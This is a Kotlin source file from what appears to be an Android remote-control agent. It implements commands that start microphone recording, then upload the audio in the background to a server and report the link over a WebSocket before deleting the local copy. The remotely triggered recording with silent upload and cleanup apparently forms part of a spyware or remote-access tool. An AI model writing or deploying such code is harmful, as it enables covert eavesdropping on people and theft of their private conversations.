package com.sentrix.agent.commands

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import com.sentrix.agent.network.Uploader
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File

/**
 * Microphone recording commands.
 * Records to AAC/M4A in internal cache, uploads on stop.
 * Works without root — requires RECORD_AUDIO permission.
 */
object AudioCommands {

    private const val TAG = "AudioCmds"

    private var recorder: MediaRecorder? = null
    private var outputFile: File?        = null
    private var isRecording = false

    fun startMicRecord(context: Context): String {
        if (isRecording) return "Already recording"

        outputFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.m4a")

        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        return try {
            recorder!!.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(outputFile!!.absolutePath)
                prepare()
                start()
            }
            isRecording = true
            Log.i(TAG, "Recording started → ${outputFile!!.name}")
            "Mic recording started"
        } catch (e: Exception) {
            Log.e(TAG, "Record start failed: ${e.message}")
            recorder?.release()
            recorder = null
            "Mic record failed: ${e.message}"
        }
    }

    fun stopMicRecord(wsClient: WebSocketClient): String {
        if (!isRecording || recorder == null) return "Not recording"

        return try {
            recorder!!.stop()
            recorder!!.release()
            recorder = null
            isRecording = false

            val file = outputFile ?: return "No output file"
            Log.i(TAG, "Recording stopped (${file.length()} bytes)")

            // Upload in background — don't block command handler
            CoroutineScope(Dispatchers.IO).launch {
                val url    = Uploader.upload(file, "audio/mp4")
                val result = Uploader.resultJson("mic_stop", url)
                wsClient.send(result)
                file.delete()
            }

            "Mic recording stopped — uploading"
        } catch (e: Exception) {
            Log.e(TAG, "Record stop failed: ${e.message}")
            "Stop record failed: ${e.message}"
        }
    }

    fun isCurrentlyRecording() = isRecording
}
